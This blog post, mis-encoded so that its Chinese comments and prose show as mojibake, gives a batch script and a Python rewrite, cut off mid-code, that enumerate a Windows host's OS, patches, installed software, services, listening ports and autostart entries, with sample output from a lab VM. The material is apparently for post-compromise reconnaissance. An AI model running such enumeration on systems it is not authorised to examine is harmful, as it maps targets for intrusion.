<h4 id="Win2003-batè„šæœ¬"><a href="#Win2003-batè„šæœ¬" class="headerlink" title="Win2003 batè„šæœ¬"></a>Win2003 batè„šæœ¬</h4><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> [+] ç³»ç»Ÿä¿¡æ¯:</span><br><span class="line">systeminfo | <span class="built_in">findstr</span> /i  /c:&quot;ä¸»æœºå&quot; /c:&quot;OS åç§°&quot; /c:&quot;OS ç‰ˆæœ¬&quot; </span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> [+] IPåœ°å€:</span><br><span class="line"><span class="keyword">for</span> /f &quot;tokens=<span class="number">2</span> delims=:&quot; <span class="variable">%%a</span> <span class="keyword">in</span> (&#x27;<span class="built_in">ipconfig</span> ^| <span class="built_in">find</span> &quot;IP Address&quot;&#x27;) <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">%%a</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> [+] åˆ—å‡ºå·²å®‰è£…çš„ä¿®å¤è¡¥ä¸:</span><br><span class="line">systeminfo | <span class="built_in">findstr</span> /i /c:&quot;ä¿®è¡¥ç¨‹åº:&quot;</span><br><span class="line"></span><br><span class="line"><span class="built_in">setlocal</span> EnableDelayedExpansion</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">REM è¿è¡Œ systeminfo å‘½ä»¤å¹¶å°†ç»“æœä¿å­˜åˆ°ä¸´æ—¶æ–‡ä»¶</span></span><br><span class="line">systeminfo &gt; systeminfo_output.txt</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">REM éå†æ–‡ä»¶å†…å®¹</span></span><br><span class="line"><span class="built_in">set</span> &quot;findPatch=false&quot;</span><br><span class="line"><span class="keyword">for</span> /f &quot;tokens=<span class="number">1</span>,* delims=:&quot; <span class="variable">%%a</span> <span class="keyword">in</span> (&#x27;<span class="built_in">type</span> systeminfo_output.txt&#x27;) <span class="keyword">do</span> (</span><br><span class="line"><span class="comment">    REM æ‰¾åˆ°åŒ…å« &quot;ä¿®è¡¥ç¨‹åº&quot; çš„è¡Œ</span></span><br><span class="line">    <span class="keyword">if</span> &quot;<span class="variable">!findPatch!</span>&quot;==&quot;true&quot; (</span><br><span class="line"><span class="comment">        REM è¾“å‡ºå½“å‰è¡Œ</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">%%a</span>:<span class="variable">%%b</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        REM æå–è¡Œä¸­çš„æ•°å­—</span></span><br><span class="line">        <span class="built_in">set</span> &quot;num=<span class="variable">%%b</span>&quot;</span><br><span class="line">        <span class="built_in">set</span> &quot;num=<span class="variable">!num:~1,1!</span>&quot;</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        REM è¾“å‡ºæ¥ä¸‹æ¥çš„ X è¡Œå†…å®¹</span></span><br><span class="line">        <span class="keyword">for</span> /l <span class="variable">%%i</span> <span class="keyword">in</span> (<span class="number">1</span>, <span class="number">1</span>, <span class="variable">!num!</span>) <span class="keyword">do</span> (</span><br><span class="line">            <span class="built_in">set</span> /p &quot;outputLine=&quot;</span><br><span class="line">            <span class="built_in">echo</span> <span class="variable">!outputLine!</span></span><br><span class="line">        )</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        REM è®¾ç½®æ ‡å¿—ä¸º falseï¼Œè¡¨ç¤ºä¸å†ç»§ç»­å¯»æ‰¾ &quot;ä¿®è¡¥ç¨‹åº&quot;</span></span><br><span class="line">        <span class="built_in">set</span> &quot;findPatch=false&quot;</span><br><span class="line">    )</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    REM æ‰¾åˆ° &quot;ä¿®è¡¥ç¨‹åº&quot; è¡Œï¼Œè®¾ç½®æ ‡å¿—ä¸º true</span></span><br><span class="line">    <span class="keyword">if</span> /i &quot;<span class="variable">%%a</span>&quot;==&quot;ä¿®è¡¥ç¨‹åº&quot; <span class="built_in">set</span> &quot;findPatch=true&quot;</span><br><span class="line">)</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">REM åˆ é™¤ä¸´æ—¶æ–‡ä»¶</span></span><br><span class="line"><span class="built_in">del</span> systeminfo_output.txt</span><br><span class="line"></span><br><span class="line"><span class="built_in">endlocal</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">setlocal</span> enabledelayedexpansion</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> [+] åˆ—å‡ºå·²å®‰è£…çš„åº”ç”¨ç¨‹åº:</span><br><span class="line"><span class="comment">rem echo [+] åˆ—å‡º HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall</span></span><br><span class="line"><span class="keyword">for</span> /f &quot;tokens=*&quot; <span class="variable">%%a</span> <span class="keyword">in</span> (&#x27;reg query &quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall&quot; <span class="number">2</span>^&gt;<span class="built_in">nul</span>&#x27;) <span class="keyword">do</span> (</span><br><span class="line">    <span class="built_in">set</span> &quot;subkey=<span class="variable">%%a</span>&quot;</span><br><span class="line">    <span class="built_in">set</span> &quot;display_name=&quot;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> /f &quot;tokens=<span class="number">2</span>,*&quot; <span class="variable">%%b</span> <span class="keyword">in</span> (&#x27;reg query &quot;<span class="variable">!subkey!</span>&quot; /v DisplayName <span class="number">2</span>^&gt;<span class="built_in">nul</span> ^| <span class="built_in">find</span> &quot;REG_SZ&quot; <span class="number">2</span>^&gt;<span class="built_in">nul</span>&#x27;) <span class="keyword">do</span> (</span><br><span class="line">        <span class="built_in">set</span> &quot;display_name=<span class="variable">%%c</span>&quot;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">defined</span> display_name (</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">!display_name!</span></span><br><span class="line">    )</span><br><span class="line">)</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rem echo [+] åˆ—å‡º HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall</span></span><br><span class="line"><span class="keyword">for</span> /f &quot;tokens=*&quot; <span class="variable">%%a</span> <span class="keyword">in</span> (&#x27;reg query &quot;HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall&quot; <span class="number">2</span>^&gt;<span class="built_in">nul</span>&#x27;) <span class="keyword">do</span> (</span><br><span class="line">    <span class="built_in">set</span> &quot;subkey=<span class="variable">%%a</span>&quot;</span><br><span class="line">    <span class="built_in">set</span> &quot;display_name=&quot;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> /f &quot;tokens=<span class="number">2</span>,*&quot; <span class="variable">%%b</span> <span class="keyword">in</span> (&#x27;reg query &quot;<span class="variable">!subkey!</span>&quot; /v DisplayName <span class="number">2</span>^&gt;<span class="built_in">nul</span> ^| <span class="built_in">find</span> &quot;REG_SZ&quot; <span class="number">2</span>^&gt;<span class="built_in">nul</span>&#x27;) <span class="keyword">do</span> (</span><br><span class="line">        <span class="built_in">set</span> &quot;display_name=<span class="variable">%%c</span>&quot;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">defined</span> display_name (</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">!display_name!</span></span><br><span class="line">    )</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">endlocal</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> --------------------------</span><br><span class="line"><span class="built_in">echo</span> [+] åˆ—å‡ºè¿è¡Œçš„æœåŠ¡:</span><br><span class="line"><span class="built_in">net</span> <span class="built_in">start</span> </span><br><span class="line"><span class="built_in">echo</span> --------------------------</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> --------------------------</span><br><span class="line"><span class="comment">rem è¿™é‡Œéœ€è¦ç®¡ç†å‘˜æƒé™ æ™®é€šç”¨æˆ·æ²¡æƒé™</span></span><br><span class="line">schtasks /query /fo table</span><br><span class="line"><span class="built_in">echo</span> --------------------------</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> ---------------------</span><br><span class="line"><span class="built_in">echo</span> [+] åˆ—å‡ºç›‘å¬çš„ç«¯å£:</span><br><span class="line">netstat -ano | <span class="built_in">find</span> &quot;LISTENING&quot;</span><br><span class="line"><span class="built_in">echo</span> ---------------------</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> [+] åˆ—å‡ºä¸»æœºä¸­çš„è‡ªå¯åŠ¨é¡¹:</span><br><span class="line"><span class="built_in">echo</span> --------------------------------</span><br><span class="line"><span class="comment">rem echo [+] Current User Run:</span></span><br><span class="line">reg query &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Run&quot; | <span class="built_in">findstr</span> /i &quot;REG_SZ&quot;</span><br><span class="line"><span class="built_in">echo</span> --------------------------------</span><br><span class="line"><span class="comment">rem echo [+] Current User RunOnce:</span></span><br><span class="line">reg query &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce&quot; | <span class="built_in">findstr</span> /i &quot;REG_SZ&quot;</span><br><span class="line"><span class="built_in">echo</span> --------------------------------</span><br><span class="line"><span class="comment">rem echo [+] Local Machine Run:</span></span><br><span class="line">reg query &quot;HKLM\Software\Microsoft\Windows\CurrentVersion\Run&quot; | <span class="built_in">findstr</span> /i &quot;REG_SZ&quot;</span><br><span class="line"><span class="built_in">echo</span> --------------------------------</span><br><span class="line"><span class="comment">rem echo [+] Local Machine RunOnce:</span></span><br><span class="line">reg query &quot;HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce&quot; | <span class="built_in">findstr</span> /i &quot;REG_SZ&quot;</span><br><span class="line"><span class="built_in">echo</span> --------------------------------</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>schtasks /query /fo table ä¹Ÿéœ€è¦ç®¡ç†å‘˜æƒé™ æ‰€ä»¥å­˜åœ¨é—®é¢˜ å¾…å®Œå–„</p>
<p>Output</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Documents and Settings\test123\æ¡Œé¢&gt;1.bat</span><br><span class="line">[+] ç³»ç»Ÿä¿¡æ¯:</span><br><span class="line">ä¸»æœºå:           TEST-C52232A016                                             </span><br><span class="line">OS åç§°:          Microsoft(R) Windows(R) Server 2003, Enterprise Edition</span><br><span class="line">OS ç‰ˆæœ¬:          5.2.3790 Service Pack 2 Build 3790</span><br><span class="line">BIOS ç‰ˆæœ¬:        INTEL  - 6040000</span><br><span class="line">[+] IPåœ°å€:</span><br><span class="line"> 192.168.181.137</span><br><span class="line">[+] åˆ—å‡ºå·²å®‰è£…çš„ä¿®å¤è¡¥ä¸:</span><br><span class="line">ä¿®è¡¥ç¨‹åº:         å®‰è£…äº† 1 ä¸ªä¿®è¡¥ç¨‹åºã€‚                                       </span><br><span class="line">                  [01]: Q147222                                               </span><br><span class="line">[+] åˆ—å‡ºå·²å®‰è£…çš„åº”ç”¨ç¨‹åº:</span><br><span class="line">Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.4148</span><br><span class="line">Python 3.4.4</span><br><span class="line">VMware Tools</span><br><span class="line">--------------------------</span><br><span class="line">å·²ç»å¯åŠ¨ä»¥ä¸‹ Windows æœåŠ¡:</span><br><span class="line"></span><br><span class="line">   Application Experience Lookup Service</span><br><span class="line">   Automatic Updates</span><br><span class="line">   COM+ Event System</span><br><span class="line">   COM+ System Application</span><br><span class="line">   Computer Browser</span><br><span class="line">   Cryptographic Services</span><br><span class="line">   DCOM Server Process Launcher</span><br><span class="line">   DHCP Client</span><br><span class="line">   Distributed Link Tracking Client</span><br><span class="line">   Distributed Transaction Coordinator</span><br><span class="line">   DNS Client</span><br><span class="line">   Error Reporting Service</span><br><span class="line">   Event Log</span><br><span class="line">   Help and Support</span><br><span class="line">   IPSEC Services</span><br><span class="line">   Logical Disk Manager</span><br><span class="line">   Network Connections</span><br><span class="line">   Network Location Awareness (NLA)</span><br><span class="line">   Plug and Play</span><br><span class="line">   Print Spooler</span><br><span class="line">   Protected Storage</span><br><span class="line">   Remote Procedure Call (RPC)</span><br><span class="line">   Remote Registry</span><br><span class="line">   Secondary Logon</span><br><span class="line">   Security Accounts Manager</span><br><span class="line">   Server</span><br><span class="line">   Shell Hardware Detection</span><br><span class="line">   System Event Notification</span><br><span class="line">   Task Scheduler</span><br><span class="line">   TCP/IP NetBIOS Helper</span><br><span class="line">   Terminal Services</span><br><span class="line">   TP AutoConnect Service</span><br><span class="line">   VMware Alias Manager and Ticket Service</span><br><span class="line">   VMware Tools</span><br><span class="line">   VMware ç‰©ç†ç£ç›˜åŠ©æ‰‹æœåŠ¡</span><br><span class="line">   Windows Management Instrumentation</span><br><span class="line">   Windows Time</span><br><span class="line">   Wireless Configuration</span><br><span class="line">   Workstation</span><br><span class="line"></span><br><span class="line">å‘½ä»¤æˆåŠŸå®Œæˆã€‚</span><br><span class="line"></span><br><span class="line">--------------------------</span><br><span class="line">--------------------------</span><br><span class="line">é”™è¯¯: æ‹’ç»è®¿é—®ã€‚</span><br><span class="line">--------------------------</span><br><span class="line">---------------------</span><br><span class="line">  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       716</span><br><span class="line">  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    0.0.0.0:1027           0.0.0.0:0              LISTENING       428</span><br><span class="line">  TCP    192.168.181.137:139    0.0.0.0:0              LISTENING       4</span><br><span class="line">---------------------</span><br><span class="line">---------------------</span><br><span class="line">[+] åˆ—å‡ºä¸»æœºä¸­çš„è‡ªå¯åŠ¨é¡¹:</span><br><span class="line">--------------------------------</span><br><span class="line">    ctfmon.exe    REG_SZ    C:\WINDOWS\system32\ctfmon.exe</span><br><span class="line">--------------------------------</span><br><span class="line">--------------------------------</span><br><span class="line">    IMJPMIG8.1    REG_SZ    &quot;C:\WINDOWS\IME\imjp8_1\IMJPMIG.EXE&quot; /Spoil /RemAdvD</span><br><span class="line">ef /Migration32</span><br><span class="line">    IMEKRMIG6.1    REG_SZ    C:\WINDOWS\ime\imkr6_1\IMEKRMIG.EXE</span><br><span class="line">    PHIME2002ASync    REG_SZ    C:\WINDOWS\system32\IME\TINTLGNT\TINTSETP.EXE /S</span><br><span class="line">YNC</span><br><span class="line">    PHIME2002A    REG_SZ    C:\WINDOWS\system32\IME\TINTLGNT\TINTSETP.EXE /IMENa</span><br><span class="line">me</span><br><span class="line">    VMware User Process    REG_SZ    &quot;C:\Program Files\VMware\VMware Tools\vmtoo</span><br><span class="line">lsd.exe&quot; -n vmusr</span><br><span class="line">--------------------------------</span><br><span class="line">--------------------------------</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<hr>
<h3 id="Version2"><a href="#Version2" class="headerlink" title="Version2"></a>Version2</h3><p>è€ƒè™‘åˆ°å…¨ç‰ˆæœ¬å…¼å®¹ é‡æ–°å†™äº†ä¸ª ä½†æ˜¯æ”¶é›†ä¿¡æ¯æœ‰é™</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">import</span> winreg</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">service_port_mapping = &#123;</span><br><span class="line">    <span class="number">21</span>: <span class="string">&quot;FTP/TFTP/VSFTPD (File Transfer Protocol)&quot;</span>,</span><br><span class="line">    <span class="number">22</span>: <span class="string">&quot;SSH (Secure Shell)&quot;</span>,</span><br><span class="line">    <span class="number">23</span>: <span class="string">&quot;Telnet (Remote Connection)&quot;</span>,</span><br><span class="line">    <span class="number">25</span>: <span class="string">&quot;SMTP (Email)&quot;</span>,</span><br><span class="line">    <span class="number">53</span>: <span class="string">&quot;DNS (Domain Name System)&quot;</span>,</span><br><span class="line">    <span class="number">67</span>: <span class="string">&quot;DHCP (Dynamic Host Configuration Protocol)&quot;</span>,</span><br><span class="line">    <span class="number">68</span>: <span class="string">&quot;DHCP (Dynamic Host Configuration Protocol)&quot;</span>,</span><br><span class="line">    <span class="number">110</span>: <span class="string">&quot;POP3 (Email)&quot;</span>,</span><br><span class="line">    <span class="number">123</span>: <span class="string">&quot;NTP&quot;</span>,</span><br><span class="line">    <span class="number">135</span>: <span class="string">&quot;RPCï¼ˆRemote Procedure Call)&quot;</span>,</span><br><span class="line">    <span class="number">137</span>: <span class="string">&quot;Samba (File Sharing)&quot;</span>,</span><br><span class="line">    <span class="number">139</span>: <span class="string">&quot;Samba (File Sharing)&quot;</span>,</span><br><span class="line">    <span class="number">143</span>: <span class="string">&quot;IMAP (Email)&quot;</span>,</span><br><span class="line">    <span class="number">161</span>: <span class="string">&quot;SNMP (Simple Network Management Protocol)&quot;</span>,</span><br><span class="line">    <span class="number">389</span>: <span class="string">&quot;LDAP (Lightweight Directory Access Protocol)&quot;</span>,</span><br><span class="line">    <span class="number">445</span>: <span class="string">&quot;SMB (Server Message Block)&quot;</span>,</span><br><span class="line">    <span class="number">512</span>: <span class="string">&quot;Linux Rexec (Remote Execution Service)&quot;</span>,</span><br><span class="line">    <span class="number">513</span>: <span class="string">&quot;Linux Rexec (Remote Execution Service)&quot;</span>,</span><br><span class="line">    <span class="number">514</span>: <span class="string">&quot;Linux Rexec (Remote Execution Service)&quot;</span>,</span><br><span class="line">    <span class="number">873</span>: <span class="string">&quot;Rsync (Remote File Synchronization)&quot;</span>,</span><br><span class="line">    <span class="number">1080</span>: <span class="string">&quot;Socket&quot;</span>,</span><br><span class="line">    <span class="number">1098</span>: <span class="string">&quot;JAVARMI&quot;</span>,</span><br><span class="line">    <span class="number">1352</span>: <span class="string">&quot;Lotus Domino (Email)&quot;</span>,</span><br><span class="line">    <span class="number">1433</span>: <span class="string">&quot;MSSQL (Microsoft SQL Server)&quot;</span>,</span><br><span class="line">    <span class="number">1521</span>: <span class="string">&quot;Oracle Database&quot;</span>,</span><br><span class="line">    <span class="number">2049</span>: <span class="string">&quot;NFS (Network File System)&quot;</span>,</span><br><span class="line">    <span class="number">2181</span>: <span class="string">&quot;Zookeeper&quot;</span>,</span><br><span class="line">    <span class="number">2222</span>: <span class="string">&quot;DA&quot;</span>,</span><br><span class="line">    <span class="number">2375</span>: <span class="string">&quot;Docker Remote API&quot;</span>,</span><br><span class="line">    <span class="number">2601</span>: <span class="string">&quot;zebra&quot;</span>,</span><br><span class="line">    <span class="number">3306</span>: <span class="string">&quot;MySQL Database&quot;</span>,</span><br><span class="line">    <span class="number">3128</span>: <span class="string">&quot;squid&quot;</span>,</span><br><span class="line">    <span class="number">3389</span>: <span class="string">&quot;RDP (Remote Desktop Protocol)&quot;</span>,</span><br><span class="line">    <span class="number">4100</span>: <span class="string">&quot;SysBase&quot;</span>,</span><br><span class="line">    <span class="number">4440</span>: <span class="string">&quot;rundeck&quot;</span>,</span><br><span class="line">    <span class="number">4848</span>: <span class="string">&quot;GlassFish Console&quot;</span>,</span><br><span class="line">    <span class="number">5000</span>: <span class="string">&quot;Sybase/DB2 Database&quot;</span>,</span><br><span class="line">    <span class="number">5422</span>: <span class="string">&quot;PostgreSQL Database&quot;</span>,</span><br><span class="line">    <span class="number">5432</span>: <span class="string">&quot;PostgreSQL Database&quot;</span>,</span><br><span class="line">    <span class="number">5632</span>: <span class="string">&quot;PCAnywhere Service&quot;</span>,</span><br><span class="line">    <span class="number">5900</span>: <span class="string">&quot;VNC (Virtual Network Computing)&quot;</span>,</span><br><span class="line">    <span class="number">5984</span>: <span class="string">&quot;CouchDB&quot;</span>,</span><br><span class="line">    <span class="number">6082</span>: <span class="string">&quot;Varnish&quot;</span>,</span><br><span class="line">    <span class="number">6379</span>: <span class="string">&quot;Redis Database&quot;</span>,</span><br><span class="line">    <span class="number">7001</span>: <span class="string">&quot;WebLogic&quot;</span>,</span><br><span class="line">    <span class="number">7002</span>: <span class="string">&quot;WebLogic&quot;</span>,</span><br><span class="line">    <span class="number">80</span>: <span class="string">&quot;HTTP&quot;</span>,</span><br><span class="line">    <span class="number">443</span>: <span class="string">&quot;HTTPS&quot;</span>,</span><br><span class="line">    <span class="number">8000</span>: <span class="string">&quot;Jdwp&quot;</span>,</span><br><span class="line">    <span class="number">8069</span>: <span class="string">&quot;Zabbix&quot;</span>,</span><br><span class="line">    <span class="number">8161</span>: <span class="string">&quot;ActiveMQ&quot;</span>,</span><br><span class="line">    <span class="number">8080</span>: <span class="string">&quot;Jboss/Tomcat/Resin/GlassFish/Jenkins/Jetty&quot;</span>,</span><br><span class="line">    <span class="number">8089</span>: <span class="string">&quot;Jboss/Tomcat/Resin/GlassFish/Jenkins/Jetty&quot;</span>,</span><br><span class="line">    <span class="number">8083</span>: <span class="string">&quot;InfluxDB&quot;</span>,</span><br><span class="line">    <span class="number">8086</span>: <span class="string">&quot;InfluxDB&quot;</span>,</span><br><span class="line">    <span class="number">8980</span>: <span class="string">&quot;OpenNMS&quot;</span>,</span><br><span class="line">    <span class="number">9000</span>: <span class="string">&quot;FastCGI&quot;</span>,</span><br><span class="line">    <span class="number">9080</span>: <span class="string">&quot;Websphere Console&quot;</span>,</span><br><span class="line">    <span class="number">9090</span>: <span class="string">&quot;Websphere Console&quot;</span>,</span><br><span class="line">    <span class="number">9200</span>: <span class="string">&quot;Elasticsearch&quot;</span>,</span><br><span class="line">    <span class="number">9300</span>: <span class="string">&quot;Elasticsearch&quot;</span>,</span><br><span class="line">    <span class="number">11211</span>: <span class="string">&quot;Memcached&quot;</span>,</span><br><span class="line">    <span class="number">27017</span>: <span class="string">&quot;MongoDB&quot;</span>,</span><br><span class="line">    <span class="number">27018</span>: <span class="string">&quot;MongoDB&quot;</span>,</span><br><span class="line">    <span class="number">50000</span>: <span class="string">&quot;SAP&quot;</span>,</span><br><span class="line">    <span class="number">50010</span>: <span class="string">&quot;Hadoop&quot;</span>,</span><br><span class="line">    <span class="number">50030</span>: <span class="string">&quot;Hadoop&quot;</span>,</span><br><span class="line">    <span class="number">50070</span>: <span class="string">&quot;Hadoop&quot;</span>,</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_startup_items</span>(<span class="params">hive, subkey</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        key = winreg.OpenKey(hive, subkey, <span class="number">0</span>, winreg.KEY_READ)</span><br><span class="line"></span><br><span class="line">        startup_items = &#123;&#125;</span><br><span class="line">        index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                name, value, _ = winreg.EnumValue(key, index)</span><br><span class="line">                startup_items[name] = value</span><br><span class="line">                index += <span class="number">1</span></span><br><span class="line">            <span class="keyword">except</span> OSError:</span><br><span class="line">                <span class="comment"># åˆ°è¾¾æ³¨å†Œè¡¨æœ«å°¾</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> startup_items</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># print(&quot;[-] Error: &#123;&#125;&quot;.format(e))</span></span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¯»å– HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span></span><br><span class="line">startup_items_current_user_run = get_startup_items(winreg.HKEY_CURRENT_USER, <span class="string">r&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;</span>)</span><br><span class="line"><span class="comment"># è¯»å– HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</span></span><br><span class="line">startup_items_current_user_runonce = get_startup_items(winreg.HKEY_CURRENT_USER, <span class="string">r&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce&quot;</span>)</span><br><span class="line"><span class="comment"># è¯»å– HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span></span><br><span class="line">startup_items_local_machine_run = get_startup_items(winreg.HKEY_LOCAL_MACHINE, <span class="string">r&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;</span>)</span><br><span class="line"><span class="comment"># è¯»å– HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</span></span><br><span class="line">startup_items_local_machine_runonce = get_startup_items(winreg.HKEY_LOCAL_MACHINE, <span class="string">r&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_startup_items</span>(<span class="params">startup_items, title</span>):</span><br><span class="line">    <span class="keyword">if</span> startup_items:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] &#123;&#125;: &quot;</span>.<span class="built_in">format</span>(title))</span><br><span class="line">        <span class="keyword">for</span> name, value <span class="keyword">in</span> startup_items.items():</span><br><span class="line">            <span class="built_in">print</span>(name)</span><br><span class="line">            <span class="comment"># print(&quot;Name: &#123;&#125;&quot;.format(name))</span></span><br><span class="line">            <span class="comment"># print(&quot;Path: &#123;&#125;&quot;.format(value))</span></span><br><span class="line">            <span class="comment"># print(&quot;-&quot;*50)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># print(&quot;&#123;&#125; is empty.\n&quot;.format(title))</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list_registry_subkeys</span>(<span class="params">hive, subkey</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> winreg.OpenKey(hive, subkey) <span class="keyword">as</span> key:</span><br><span class="line">            subkeys_count, _, _ = winreg.QueryInfoKey(key)</span><br><span class="line">            subkeys = [winreg.EnumKey(key, i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(subkeys_count)]</span><br><span class="line">            <span class="keyword">return</span> subkeys</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># print(&quot;[-] Error: &#123;&#125;&quot;.format(e))</span></span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_registry_value</span>(<span class="params">hive, subkey, value_name</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> winreg.OpenKey(hive, subkey) <span class="keyword">as</span> key:</span><br><span class="line">            value, _ = winreg.QueryValueEx(key, value_name)</span><br><span class="line">            <span class="keyword">return</span> value</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># print(&quot;[-] Error: &#123;&#125;&quot;.format(e))</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getInstallAppInfo</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] è·å–ä¸»æœºå·²å®‰è£…åº”ç”¨ä¿¡æ¯......&quot;</span>)</span><br><span class="line">    <span class="comment"># åˆ—å‡º HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall ä¸‹çš„å­é¡¹åŠå…¶ DisplayName å€¼</span></span><br><span class="line">    hive1 = winreg.HKEY_LOCAL_MACHINE</span><br><span class="line">    subkey = <span class="string">r&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall&quot;</span></span><br><span class="line">    subkeys1 = list_registry_subkeys(hive1, subkey)</span><br><span class="line"></span><br><span class="line">    hive2 = winreg.HKEY_CURRENT_USER</span><br><span class="line">    subkeys2 = list_registry_subkeys(hive2, subkey)</span><br><span class="line">    <span class="keyword">if</span> subkeys1:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] HKLM:&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ‰“å°ç»“æœ</span></span><br><span class="line">    <span class="keyword">for</span> subkey_name <span class="keyword">in</span> subkeys1:</span><br><span class="line">        subkey_path = <span class="string">r&quot;&#123;&#125;\&#123;&#125;&quot;</span>.<span class="built_in">format</span>(subkey, subkey_name)</span><br><span class="line">        display_name = get_registry_value(hive1, subkey_path, <span class="string">&quot;DisplayName&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> display_name:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(display_name))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(&quot;-&quot; * 50)</span></span><br><span class="line">    <span class="keyword">if</span> subkeys2:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] HKCU:&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> subkey_name <span class="keyword">in</span> subkeys2:</span><br><span class="line">        subkey_path = <span class="string">r&quot;&#123;&#125;\&#123;&#125;&quot;</span>.<span class="built_in">format</span>(subkey, subkey_name)</span><br><span class="line">        display_name = get_registry_value(hive2, subkey_path, <span 